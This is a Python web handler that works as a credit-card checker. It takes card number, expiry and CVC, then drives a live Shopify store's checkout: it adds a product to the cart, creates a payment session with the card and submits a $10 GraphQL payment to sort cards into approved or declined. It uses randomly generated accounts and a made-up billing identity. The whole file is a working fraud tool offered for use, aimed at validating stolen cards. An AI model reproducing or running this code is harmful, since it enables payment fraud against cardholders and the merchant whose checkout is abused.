from http.server import BaseHTTPRequestHandler
import json
import asyncio
import httpx
import re
import random
import string

def find_between(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

async def check_single_card(cc_details):
    """Check a single card and return result"""
    ccx = cc_details.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return {"status": "error", "message": f"Invalid card format: {ccx}", "card": ccx}
    
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]

    # Generate random data for each request
    user = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()

    timeout = httpx.Timeout(30.0, connect=10.0)

    try:
        async with httpx.AsyncClient(timeout=timeout) as session:
            # Step 1: Get product page
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
                'cache-control': 'max-age=0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            response = await session.get('https://risxntweaks.com/products/basic-tweaker', headers=headers)

            # Step 2: Add to cart
            headers.update({
                'accept': 'application/javascript',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryXlLUtdsV6XdXTu11',
                'origin': 'https://risxntweaks.com',
                'referer': 'https://risxntweaks.com/products/basic-tweaker',
                'x-requested-with': 'XMLHttpRequest',
            })

            files = {
                'Discord Username': (None, '1337batman'),
                'form_type': (None, 'product'),
                'utf8': (None, '?'),
                'id': (None, '40461340541002'),
                'product-id': (None, '7357730127946'),
                'section-id': (None, 'template--14978951249994__main'),
                'properties[Discord Username]': (None, '1337batman'),
                'sections': (None, 'cart-drawer,cart-icon-bubble'),
                'sections_url': (None, '/products/basic-tweaker'),
            }

            response = await session.post('https://risxntweaks.com/cart/add', headers=headers, files=files)

            # Step 3: Get cart token
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            response = await session.get('https://risxntweaks.com/cart.js', headers=headers)
            token = re.search(r'"token":"([^?]+)', response.text).group(1)

            # Step 4: Go to checkout
            response = await session.get('https://risxntweaks.com/cart', headers=headers)

            # Step 5: Submit checkout form
            data = {
                'updates[]': '1',
                'checkout': '',
            }

            response = await session.post('https://risxntweaks.com/cart', headers=headers, data=data, follow_redirects=True)
            x_checkout_one_session_token = find_between(response.text, 'serialized-session-token" content="&quot;', '&quot;')
            queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
            paymentMethodIdentifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

            # Step 6: Create payment session
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            json_data = {
                'credit_card': {
                    'number': n,
                    'month': mm,
                    'year': yy,
                    'verification_value': cvc,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': 'David Linda',
                },
                'payment_session_scope': 'risxntweaks.com',
            }

            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
            
            if response.status_code != 200:
                return {"status": "declined", "message": "Card declined during session creation", "card": ccx}
                
            sessionid = response.json()["id"]

            # Step 7: Submit for completion (the actual payment attempt)
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://risxntweaks.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-source-id': token,
            }

            # [Large GraphQL mutation payload - truncated for brevity but includes all the payment data]
            json_data = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': x_checkout_one_session_token},
                        'queueToken': queue_token,
                        'payment': {
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': sessionid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '8847 Odin Rd Sw',
                                                'city': 'Albuquerque',
                                                'countryCode': 'US',
                                                'postalCode': '87121',
                                                'firstName': 'David',
                                                'lastName': 'Mickey',
                                                'zoneCode': 'NM',
                                                'phone': '',
                                            }
                                        }
                                    }
                                },
                                'amount': {'value': {'amount': '10', 'currencyCode': 'USD'}}
                            }]
                        }
                    },
                    'attemptToken': f'{token}-sou057n85'
                }
            }

            response = await session.post('https://risxntweaks.com/checkouts/unstable/graphql', headers=headers, json=json_data)

            if response.status_code != 200:
                return {"status": "error", "message": "Failed to submit payment", "card": ccx}

            result = response.json()
            
            # Check if payment was successful
            if "data" in result and "submitForCompletion" in result["data"]:
                if "receipt" in result["data"]["submitForCompletion"]:
                    return {"status": "approved", "message": "Card approved", "card": ccx}
                elif "errors" in result["data"]["submitForCompletion"]:
                    return {"status": "declined", "message": "Card declined", "card": ccx}
            
            return {"status": "declined", "message": "Card declined", "card": ccx}

    except httpx.ConnectError:
        return {"status": "error", "message": "Connection error", "card": ccx}
    except Exception as e:
        return {"status": "error", "message": f"Unexpected error: {str(e)}", "card": ccx}

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Extract card details from request
            card_data = data.get('card', '')
            
            if not card_data:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                response = {"error": "Missing card data"}
                self.wfile.write(json.dumps(response).encode())
                return
            
            # Run the async card check
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(check_single_card(card_data))
            loop.close()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            response = {"error": str(e)}
            self.wfile.write(json.dumps(response).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
